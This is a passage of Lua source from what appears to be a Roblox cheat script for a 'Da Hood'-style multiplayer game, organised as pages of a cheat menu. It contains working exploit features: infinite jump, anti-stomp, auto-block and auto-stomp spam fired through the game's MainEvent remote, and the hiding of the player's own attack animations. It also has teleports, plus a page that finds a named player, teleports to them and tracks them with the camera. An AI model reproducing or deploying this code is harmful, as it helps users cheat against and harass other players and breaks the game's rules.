            local ChestPumpTextButton = ScrollingFrame.ChestPumpButton
            local PrayingTextButton = ScrollingFrame.PrayingButton
            local TheDefaultTextButton = ScrollingFramePlus.TheDefaultButton
            local SturdyTextButton = ScrollingFramePlus.SturdyButton
            local RossyTextButton = ScrollingFramePlus.RossyButton
            local GriddyTextButton = ScrollingFramePlus.GriddyButton
            local TPoseTextButton = ScrollingFramePlus.TPoseButton
            local SpeedBlitzTextButton = ScrollingFramePlus.SpeedBlitzButton
        
            AnimationPack.MouseButton1Click:Connect(function()
                if ScrollingFrame.Visible == false then
                    ScrollingFrame.Visible = true
                    CloseButton.Visible = true
                    AnimationPackPlus.Visible = false
                end
            end)
            AnimationPackPlus.MouseButton1Click:Connect(function()
                if ScrollingFramePlus.Visible == false then
                    ScrollingFramePlus.Visible = true
                    CloseButtonPlus.Visible = true
                    AnimationPack.Visible = false
                end
            end)
            CloseButton.MouseButton1Click:Connect(function()
                if ScrollingFrame.Visible == true then
                    ScrollingFrame.Visible = false
                    CloseButton.Visible = false
                    AnimationPackPlus.Visible = true
                end
            end)
            CloseButtonPlus.MouseButton1Click:Connect(function()
                if ScrollingFramePlus.Visible == true then
                    ScrollingFramePlus.Visible = false
                    CloseButtonPlus.Visible = false
                    AnimationPack.Visible = true
                end
            end)
        
            LeanTextButton.MouseButton1Click:Connect(function()
                Stop()
                Lean:Play()
            end)
            LayTextButton.MouseButton1Click:Connect(function()
                Stop()
                Lay:Play()
            end)
            Dance1TextButton.MouseButton1Click:Connect(function()
                Stop()
                Dance1:Play()
            end)
            Dance2TextButton.MouseButton1Click:Connect(function()
                Stop()
                Dance2:Play()
            end)
            GreetTextButton.MouseButton1Click:Connect(function()
                Stop()
                Greet:Play()
            end)
            ChestPumpTextButton.MouseButton1Click:Connect(function()
                Stop()
                ChestPump:Play()
            end)
            PrayingTextButton.MouseButton1Click:Connect(function()
                Stop()
                Praying:Play()
            end)
            TheDefaultTextButton.MouseButton1Click:Connect(function()
                Stop()
                TheDefault:Play()
            end)
            SturdyTextButton.MouseButton1Click:Connect(function()
                Stop()
                Sturdy:Play()
            end)
            RossyTextButton.MouseButton1Click:Connect(function()
                Stop()
                Rossy:Play()
            end)
            GriddyTextButton.MouseButton1Click:Connect(function()
                Stop()
                Griddy:Play()
            end)
            TPoseTextButton.MouseButton1Click:Connect(function()
                Stop()
                TPose:Play()
            end)
            SpeedBlitzTextButton.MouseButton1Click:Connect(function()
                Stop()
                SpeedBlitz:Play()
            end)
        
            game:GetService("Players").LocalPlayer.Character.Humanoid.Running:Connect(function()
                Stop()
            end)
        
            game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
                Stop()
            end)
        end
        AnimationPack(game.Players.LocalPlayer.Character)
        game.Players.LocalPlayer.CharacterAdded:Connect(AnimationPack)
	end
})




local CombatPage = UI:CreatePage("Combat")
local CombatSelection = CombatPage:CreateSection("Combats:")

local connection

CombatSelection:CreateToggle({
    Name = "Inf Jump",
    Flag = "Inf Jump",
    Default = false,
    Callback = function(infjump)
        if infjump then
            if not connection then
                connection = game:GetService('UserInputService').InputBegan:Connect(function(input, gameProcessedEvent)
                    if input.KeyCode == Enum.KeyCode.Space and not gameProcessedEvent then
                        while infjump and game:GetService('UserInputService'):IsKeyDown(Enum.KeyCode.Space) do
                            wait()
                            if game.Players:FindFirstChildOfClass("Player") and game.Players:FindFirstChildOfClass("Player").Character then
                                if game.Players:FindFirstChildOfClass("Player").Character:FindFirstChildOfClass('Humanoid') then
                                    game.Players:FindFirstChildOfClass("Player").Character:FindFirstChildOfClass('Humanoid').JumpPower = 50
                                    game.Players:FindFirstChildOfClass("Player").Character:FindFirstChildOfClass('Humanoid'):ChangeState(Enum.HumanoidStateType.Jumping)
                                end
                            end
                        end
                    end
                end)
            end
        else
            if connection then
                connection:Disconnect()
                connection = nil 
            end
        end
    end
})


CombatSelection:CreateToggle({
    Name = "Anti Stomp",
    Flag = "Anti Stomp",
    Default = false,
    Callback = function(enabled)
        local player = game.Players.LocalPlayer
        local character = player.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")

        if enabled then
            game:GetService('RunService'):BindToRenderStep("Anti-Stomp", 0, function()
                if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
                    game.Players.LocalPlayer.Character.Head:Destroy()
                    game.Players.LocalPlayer.Character.RightHand:Destroy()
                    game.Players.LocalPlayer.Character.LeftHand:Destroy()
                    game.Players.LocalPlayer.Character.LowerTorso:Destroy()
                    game.Players.LocalPlayer.Character.UpperTorso:Destroy()
                    game.Players.LocalPlayer.Character.LeftLowerLeg:Destroy()
                    game.Players.LocalPlayer.Character.RightLowerLeg:Destroy()
                    game.Players.LocalPlayer.Character.RightFoot:Destroy()
                    game.Players.LocalPlayer.Character.LeftFoot:Destroy()
                    game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
                    game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
                    game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
                    game.Players.LocalPlayer.Character.RightLowerArm:Destroy()
                    game.Players.LocalPlayer.Character.LeftLowerArm:Destroy()
                    game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
                end
            end)
        else
            game:GetService('RunService'):UnbindFromRenderStep("Anti-Stomp")
        end
    end
})







CombatSelection:CreateToggle({
    Name = "God Block",
    Flag = "God Block",
    Default = false,
    Callback = function(t)
        if t == true then
            if getgenv().AUTO_BLOCK__ then
            else
            game.ReplicatedStorage.MainEvent:FireServer("ResetNew")game.Players.LocalPlayer.Character.Humanoid:ChangeState'Dead'
            end
            game:GetService("ReplicatedStorage").ClientAnimations.Block.AnimationId = "rbxassetid://0"
            local OWNER = game:GetService("Players").LocalPlayer
            local GUN_CHECK = nil
            task.wait()
            function Block()
                game.ReplicatedStorage.MainEvent:FireServer("Block",true) wait()
                game.ReplicatedStorage.MainEvent:FireServer("Block",false)
            end
            if getgenv().AUTO_BLOCK__ then getgenv().AUTO_BLOCK__:Disconnect() end
            getgenv().AUTO_BLOCK__ = game:GetService("RunService").Stepped:Connect(function()
                if blocking == true then
                    if OWNER.Character.BodyEffects:FindFirstChild('Block') then OWNER.Character.BodyEffects.Block:Destroy() end
                    GUN_CHECK = OWNER.Character:FindFirstChildWhichIsA("Tool")
                    if GUN_CHECK then
                        if GUN_CHECK:FindFirstChild("GunScript") then
                            game.ReplicatedStorage.MainEvent:FireServer("Block",false)
                        else
                            Block()
                        end
                    else
                        Block()
                    end
                    end
                end)
            blocking = true
            task.wait()    
        elseif t == false then
            blocking = false
        end
    end
})



CombatSelection:CreateToggle({
    Name = "Auto Reload",
    Flag = "Auto Reload",
    Default = false,
    Callback = function(r)
        if r == true then
            game:GetService('RunService'):BindToRenderStep("Auto-Reload", 0 , function()
                if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
                        if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
                            game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) 
                            wait(1)
                        end
                    end
                end
            end)
        elseif r == false then
            game:GetService('RunService'):UnbindFromRenderStep("Auto-Reload")
        end
    end
})



CombatSelection:CreateToggle({
    Name = "Auto Stomp",
    Flag = "Auto Stomp",
    Default = false,
    Callback = function(r)
        if r == true then
            game:GetService('RunService'):BindToRenderStep("Auto-Stomp", 0 , function()
                game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
            end)
        elseif r == false then
            game:GetService('RunService'):UnbindFromRenderStep("Auto-Stomp")
        end
    end
})


CombatSelection:CreateButton({
	Name = "No Recoil";
	Callback = function() 
        local player = game.Players.LocalPlayer
        for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
            if v:IsA('Camera') then
                v:Destroy()
            end
        end
        local newcam = Instance.new('Camera')
        newcam.Parent = game:GetService('Workspace')
        newcam.Name = 'Camera'
        newcam.CameraType = 'Custom'
        newcam.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
        newcam.HeadLocked = true
        newcam.HeadScale = 1
	end
})
------------------------------

local SlientPage = UI:CreatePage("Slient") -- creates a section in page with the name passed. This argument is reqiured.
local SelectionSlient = SlientPage:CreateSection("Slients:")







SelectionSlient:CreateButton({
	Name = "Slient Punch";
	Callback = function() 
        game:GetService("RunService").RenderStepped:Connect(function()
            for i, v in pairs(game:GetService("Players").LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
            if v.Animation.AnimationId:match("rbxassetid://2788309317") or v.Animation.AnimationId:match("rbxassetid://2788309982") or v.Animation.AnimationId:match("rbxassetid://3354699999") or v.Animation.AnimationId:match("rbxassetid://2788289281") or v.Animation.AnimationId:match("rbxassetid://2788292075") or v.Animation.AnimationId:match("rbxassetid://3355740058") or v.Animation.AnimationId:match("rbxassetid://2788311138") or v.Animation.AnimationId:match("rbxassetid://3354696735") or v.Animation.AnimationId:match("rbxassetid://2788290270") or v.Animation.AnimationId:match("rbxassetid://2788305271") or v.Animation.AnimationId:match("rbxassetid://2788308661") then
            v:Stop()
            end
            end
            end)
	end
})



SelectionSlient:CreateButton({
	Name = "Slient Block";
	Callback = function() 
        game:GetService("RunService").RenderStepped:Connect(function()
            for i, v in pairs(game:GetService("Players").LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
            if v.Animation.AnimationId:match("rbxassetid://2788354405") then
            v:Stop()
            end
            end
            end)
	end
})




SelectionSlient:CreateButton({
	Name = "Slient Stomp";
	Callback = function() 
        game:GetService("RunService").RenderStepped:Connect(function()
            for i, v in pairs(game:GetService("Players").LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
            if v.Animation.AnimationId:match("rbxassetid://2816431506") then
            v:Stop()
            end
            end
            end)
	end
})



SelectionSlient:CreateButton({
	Name = "Slient Boombox";
	Callback = function() 
		if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
			local Tool = nil
			if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") and LMAO == true then
				Tool = game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
				game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Parent = game:GetService("Players").LocalPlayer.Backpack
			end
			game:GetService("Players").LocalPlayer.Backpack["[Boombox]"].Parent =
				game:GetService("Players").LocalPlayer.Character
			game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
			game:GetService("Players").LocalPlayer.Character["[Boombox]"].RequiresHandle = false
			if game:GetService("Players").LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
				game:GetService("Players").LocalPlayer.Character["[Boombox]"].Handle:Destroy()
			end
			game:GetService("Players").LocalPlayer.Character["[Boombox]"].Parent =
				game:GetService("Players").LocalPlayer.Backpack
			game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
			if Tool ~= true then
				if Tool then
					Tool.Parent = game:GetService("Players").LocalPlayer.Character
				end
			end
end
	end
})



local FunPage = UI:CreatePage("Fun") -- creates a section in page with the name passed. This argument is reqiured.
local SelectionFun = FunPage:CreateSection("Fun:")


SelectionFun:CreateButton({
	Name = "Instant-Transmission";
	Callback = function() 
        local OriginalKeyUpValue = 0
function StopAudio()
	if game:GetService("Players").LocalPlayer.Character.LowerTorso:FindFirstChild("BOOMBOXSOUND") then
		game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND:Stop()
	end
end
function stop(ID, Key)
	local cor = coroutine.wrap(function()
		wait(game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
		if game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
			StopAudio()
		end
	end)
	cor()
end
function play(ID, STOP, LMAO)
	if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
		local Tool = nil
		if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") and LMAO == true then
			Tool = game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
			game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Parent = game:GetService("Players").LocalPlayer.Backpack
		end
		game:GetService("Players").LocalPlayer.Backpack["[Boombox]"].Parent =
			game:GetService("Players").LocalPlayer.Character
		game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
		game:GetService("Players").LocalPlayer.Character["[Boombox]"].RequiresHandle = false
		if game:GetService("Players").LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
			game:GetService("Players").LocalPlayer.Character["[Boombox]"].Handle:Destroy()
		end
		game:GetService("Players").LocalPlayer.Character["[Boombox]"].Parent =
			game:GetService("Players").LocalPlayer.Backpack
		game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
		if Tool ~= true then
			if Tool then
				Tool.Parent = game:GetService("Players").LocalPlayer.Character
			end
		end
		if STOP == true then
			game:GetService("Players").LocalPlayer.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
			local cor = coroutine.wrap(function()
				repeat wait() until game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and game:GetService("Players").LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
				OriginalKeyUpValue = OriginalKeyUpValue+1
				stop(ID, OriginalKeyUpValue)
			end)
			cor()
		end
	end
end



          local player = game.Players.LocalPlayer
        local TranmissionAnim = Instance.new("Animation")
        TranmissionAnim.AnimationId = "rbxassetid://3380627692"
        local TranmissionPlayAnim = player.Character:WaitForChild("Humanoid"):LoadAnimation(TranmissionAnim)
	function Tptool()

    Mouse = game.Players.LocalPlayer:GetMouse()
	local speaker = game.Players.LocalPlayer
	local TpTool = Instance.new("Tool")
	TpTool.Name = "Instant Transmission"
	TpTool.RequiresHandle = false
	TpTool.Parent = game.Players.LocalPlayer.Backpack
	TpTool.Activated:Connect(function()
		local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
		local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
		if not Char or not HRP then
			return
		end


        TranmissionPlayAnim:Play()
        TranmissionPlayAnim:AdjustSpeed(0.9)

        wait(.2)

        play(6438294336, true, true)

        wait(.2)

		HRP.CFrame = CFrame.new(Mouse.Hit.X, Mouse.Hit.Y + 3, Mouse.Hit.Z, select(4, HRP.CFrame:components()))
        task.wait()
        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()

        if game.Players.LocalPlayer.Backpack:FindFirstChild("Instant Transmission") then
            game.Players.LocalPlayer.Backpack:FindFirstChild("Instant Transmission").Parent = game.Players.LocalPlayer.Character
        end

	end)

	end
	Tptool()

game.Players.LocalPlayer.CharacterAdded:connect(function()
	game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
	wait(1)
  Tptool()
end)
	end
})









SelectionFun:CreateButton({
	Name = "One-Kick";
	Callback = function() 
        TweenService = game:GetService("TweenService")
        OWNER = game:GetService("Players").LocalPlayer
        --//------------------------------------------------------------------------------------------\\--
        local OriginalKeyUpValue = 0
        function StopAudio()
            game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
        end
        --//------------------------------------------------------------------------------------------\\--
        function stop(ID, Key)
            local cor = coroutine.wrap(function()
                wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
                if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
                    StopAudio()
                end
            end)
            cor()
        end
        --//------------------------------------------------------------------------------------------\\--
        function Play(ID)
            if OWNER.Backpack:FindFirstChild("[Boombox]") then
                local Tool = nil
                OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
                game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
                OWNER.Character["[Boombox]"].RequiresHandle = false
                OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
                OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
                if Tool ~= true then
                    if Tool then
                        Tool.Parent = OWNER.Character
                    end
                end
                OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
                    local cor = coroutine.wrap(function()
                        repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                        OriginalKeyUpValue = OriginalKeyUpValue+1
                        stop(ID, OriginalKeyUpValue)
                    end)
                cor()
            end
        end
        
            local Player = game.Players.LocalPlayer
            local Swing1 = Instance.new('Animation', game.ReplicatedStorage)
            Swing1.AnimationId = 'rbxassetid://8254794168'
        
            local Swing2 = Instance.new('Animation', game.ReplicatedStorage)
            Swing2.AnimationId = 'rbxassetid://8254792138'
        
            local Swing3 = Instance.new('Animation', game.ReplicatedStorage)
            Swing3.AnimationId = 'rbxassetid://8254789608'
        
            local Swing4 = Instance.new('Animation', game.ReplicatedStorage)
            Swing4.AnimationId = 'rbxassetid://8254787838'
        
            local Swing5 = Instance.new('Animation', game.ReplicatedStorage)
            Swing5.AnimationId = 'rbxassetid://2788307715'
        
            local _1 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing1)
            local _2 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing2)
            local _3 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing3)
            local _4 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing4)
            local _5 = Player.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Swing5)
        
            game:GetService('RunService'):BindToRenderStep("crash", 0 , function()
                for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
                    if (v.Animation.AnimationId:match("rbxassetid://2788309982")) then
                        v:Stop(0);
                        _2:Stop()
                        _3:Stop()
                        _1:Play()
                        _4:Stop()
                        _1:AdjustSpeed(2.4)    
                    elseif (v.Animation.AnimationId:match("rbxassetid://2788311138")) then
                        v:Stop(0);
                        _1:Stop()
                        _3:Stop()
                        _2:Play()
                        _4:Stop()
                        _2:AdjustSpeed(2.4)
                    elseif (v.Animation.AnimationId:match("rbxassetid://2788306916")) then
                        v:Stop(0);
                        _1:Stop()
                        _3:Stop()
                        _2:Play()
                        _4:Stop()
                        _2:AdjustSpeed(2.4)
                    elseif (v.Animation.AnimationId:match("rbxassetid://2788305271")) then
                        v:Stop(0);
                        _1:Stop()
                        _3:Stop()
                        _2:Play()
                        _4:Stop()
                        _2:AdjustSpeed(2.4)
                    elseif (v.Animation.AnimationId:match("rbxassetid://2788308661")) then
                        v:Stop(0);
                        _1:Stop()
                        _2:Stop()
                        _3:Play()
                        _4:Stop()
                        _3:AdjustSpeed(2.4)
                    elseif (v.Animation.AnimationId:match("rbxassetid://2788309317")) then
                        v:Stop(0);
                        _1:Stop()
                        _2:Stop()
                        _3:Stop()
                        _4:Play()
                        _4:AdjustSpeed(2.4)
                    elseif (v.Animation.AnimationId:match("rbxassetid://2788289281")) then
                        v:Stop(0);
                    elseif (v.Animation.AnimationId:match("rbxassetid://2788292075")) then
                        v:Stop(0);
                        _2:Stop()
                        _3:Stop()
                        _1:Stop()
                        _5:Play()
                        _4:Stop()
                        _5:AdjustSpeed(2.4) 
                    elseif (v.Animation.AnimationId:match("rbxassetid://3354699999")) then
                        v:Stop(0);
                        _1:Stop()
                        _3:Stop()
                        _2:Play()
                        _4:Stop()
                        _2:AdjustSpeed(2.4)
                    end;
                end
            end)
        
            game:GetService("RunService").heartbeat:Connect(function()
                for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
                    if (v.Animation.AnimationId:match("rbxassetid://2809419094"))
                    or (v.animation.AnimationId:match("rbxassetid://2877910736"))
                    or (v.animation.AnimationId:match("rbxassetid://2809413000")) then
                        v:Stop()
                    end
                end
            end)
        
            function kick()
                local KIckAnim = Instance.new('Animation');
                KIckAnim.AnimationId = "rbxassetid://8254765806";--3354696735
                    tool = Instance.new("Tool")
                    tool.RequiresHandle = false
                    tool.Name = "one kick"
                    tool.Activated:Connect(function()
                        game.Players.LocalPlayer.Backpack["Combat"].Parent = game.Players.LocalPlayer.Character
                        game.ReplicatedStorage.MainEvent:FireServer("ChargeButton")
                        wait(1)
                   Play(6073433216)
                    wait(0.1)
                    Call()
                    end)
                    tool.Parent = game.Players.LocalPlayer.Backpack
                end;
                game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR');
                kick()  
	end
})












local TeleportYesss = UI:CreatePage("Teleport") -- creates a section in page with the name passed. This argument is reqiured.
local TeleportsImport = TeleportYesss:CreateSection("Teleports:")



local tweenService = game:GetService("TweenService")

local TweenTp = true



TeleportsImport:CreateButton({
    Name = "Bank-Roof",
    Callback = function()
        local targetCFrame = CFrame.new(-445.0479736328125, 39.00069046020508, -285.4665832519531)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Bank-Inside",
    Callback = function()
        local targetCFrame = CFrame.new(-482.6307678222656, 23.10064125061035, -284.7492370605469)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "UPHILL GUNZ",
    Callback = function()
        local targetCFrame = CFrame.new(481.9257507324219, 48.00498962402344, -605.2094116210938)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "DOWNHILL GUNZ",
    Callback = function()
        local targetCFrame = CFrame.new(-566.3953247070312, 7.999846935272217, -737.2276000976562)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "School",
    Callback = function()
        local targetCFrame = CFrame.new(-653.1903076171875, 21.747146606445312, 257.7499694824219)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Casino",
    Callback = function()
        local targetCFrame = CFrame.new(-826.77294921875, 21.25499725341797, -172.3592987060547)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Da Theatre",
    Callback = function()
        local targetCFrame = CFrame.new(-1006.0830078125, 21.75, -165.73167419433594)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "BasketBall Court",
    Callback = function()
        local targetCFrame = CFrame.new(-931.5423583984375, 22.099815368652344, -484.516357421875)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Skate-Park",
    Callback = function()
        local targetCFrame = CFrame.new(-794.5396728515625, 21.999818801879883, -486.24359130859375)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Hood Fitness",
    Callback = function()
        local targetCFrame = CFrame.new(-76.38581848144531, 22.70029067993164, -622.400390625)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Boxing-Club",
    Callback = function()
        local targetCFrame = CFrame.new(-232.27947998046875, 22.067298889160156, -1119.863037109375)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Theme Park",
    Callback = function()
        local targetCFrame = CFrame.new(146.5379180908203, 24.755002975463867, -990.1775512695312)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Taco Shop",
    Callback = function()
        local targetCFrame = CFrame.new(558.2158813476562, 51.06139373779297, -491.1151123046875)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})

TeleportsImport:CreateButton({
    Name = "Gas Station",
    Callback = function()
        local targetCFrame = CFrame.new(560.0921020507812, 47.77998733520508, -254.2598114013672)
        if TweenTp then
            tweenService:Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = targetCFrame}):Play()
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
        end
    end
})


local MyParagraph8 = TeleportsImport:CreateParagraph("Method Of Teleport:") -- creates a paragraph element with "Hello world!" as the text content


TeleportsImport:CreateButton({
    Name = "Tween Method",
    Callback = function()
        TweenTp = true
    end
})

TeleportsImport:CreateButton({
    Name = "Normal Method",
    Callback = function()
        TweenTp = false
    end
})

function findtarget(target)
    for i,v in pairs(game.Players:GetChildren()) do
        if (string.sub(string.lower(v.Name),1,string.len(target))) == string.lower(target) then
            return v.Name
        end
    end


    for i,v in pairs(game.Players:GetChildren()) do
        if (string.sub(string.lower(v.DisplayName),1,string.len(target))) == string.lower(target) then
            return v.Name
        end
    end    
end



local Targettab = UI:CreatePage("Target") -- creates a section in page with the name passed. This argument is reqiured.
local TargetImport = Targettab:CreateSection("Target:")


local locktarget = ""
TargetImport:CreateTextBox({
	Name = "Target User:"; -- required: name of element 
	Flag = "Target User:"; -- required: unique flag name to use
	Callback = function(val)  -- function to be called when the textbox's focus is lost  
        if val == "" then
            return
        end
         locktarget = findtarget(val)
         game.StarterGui:SetCore("SendNotification", {
            Title = "Target Found"; 
            Text = "Target Has Found User: " .. locktarget;
            Duration = 5;
        })
	end;
	DefaultText = "-- target user"; -- required: text that will be in the textbox when there is no configurations saved or config saving is disabled
	ClearTextOnFocus = true; -- optional: whether to clear text when the textbox is focused, default is false
})








TargetImport:CreateButton({
    Name = "Goto",
    Callback = function()
        if game.Players:FindFirstChild(locktarget) then
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Players")[locktarget].Character.HumanoidRootPart.Position) * CFrame.new(0, 0, 2)
         elseif not game.Players:FindFirstChild(locktarget) then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Oh Uh"; 
                Text = "Target Not Found";
                Duration = 5;
            }) 
         end
    end
})


TargetImport:CreateToggle({
    Name = "View",
    Flag = "View",
    Default = false,
    Callback = function(bool)
        if bool then

            viewingplr = true
           
           game.Workspace.Camera.CameraSubject = game.Players[locktarget].Character.Humanoid;
         
           game.Players[locktarget].CharacterAdded:connect(function()
               game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
